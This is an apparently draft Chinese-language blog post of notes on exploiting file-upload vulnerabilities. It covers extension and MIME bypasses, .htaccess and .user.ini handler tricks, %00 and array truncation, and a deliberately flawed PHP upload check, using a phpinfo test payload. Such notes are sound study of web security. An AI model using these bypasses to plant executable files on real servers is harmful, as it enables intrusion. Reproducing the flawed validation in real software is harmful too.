---
layout: post
title: File-Upload
subtitle: File-Upload
date: 2025-06-17 16:22
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags: 
published: false
---
## 1. 文件上传漏洞利用

### 1.1. 前端绕过

上传.php.jpg 文件，bp 抓包修改后缀

```http
filename="shell.php"
Content-Type: image/jpeg

GIF89a
<?php phpinfo();?>
```

![image.png](https://img.ghostliner.top/BVGH0r.png)

### 1.2. 其他文件格式

一般 php可执行文件格式：`php` `php2` `php3` `php4` `php5` `phtml`

原理：apache `httpd.config` 文件配置

```
AddType application/x-httpd-php .php .phtml .php3
```

### 1.3. 配置文件利用

**条件：可以上传配置文件**

可利用 apache 配置文件 `.htaccess`

```
<FilesMatch "webshell">
Sethandler application/x-httpd-php
</FilesMatch>
# or
AddHandler application/x-httpd-php .xxx
```

php 配置文件 `.user.ini` <mark style="background: #BBFABBA6;">必须运行在 fastcgi 模式</mark>

```ini
auto_prepend_file = 123.txt
auto_append_file = 123.txt
```

### 1.4. 二次渲染

上传图片经二次渲染时，可通过010比较前后两个图片未修改部分，将代码插入其中

### 1.5. 其他绕过方式

大写 `.PHP`、双写 `.pphphp` 、末尾加点 `.php.` `.php. .` 、`.php::$data`

%00 截断（要求php版本小于5.3.4，php的magic_quotes_gpc为OFF状态）

#### 1.5.1. get 截断

![image.png](https://img.ghostliner.top/yKCXlN.png)

#### 1.5.2. post 截断

将 `%00` 进行url转码，请求体内容不会自动转码

![image.png](https://img.ghostliner.top/Uxyrhj.png)

#### 1.5.3. 数组截断

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

分析代码：

`$file[count($file) - 1]`，正常情况是获取$file数组最后一个下标数据，`count()` 函数在统计数组个数时只统计所有已定义元素，当 `save_name[1]` 未定义时，返回值为2.

构造 payload

![image.png](https://img.ghostliner.top/8KeRaf.png)
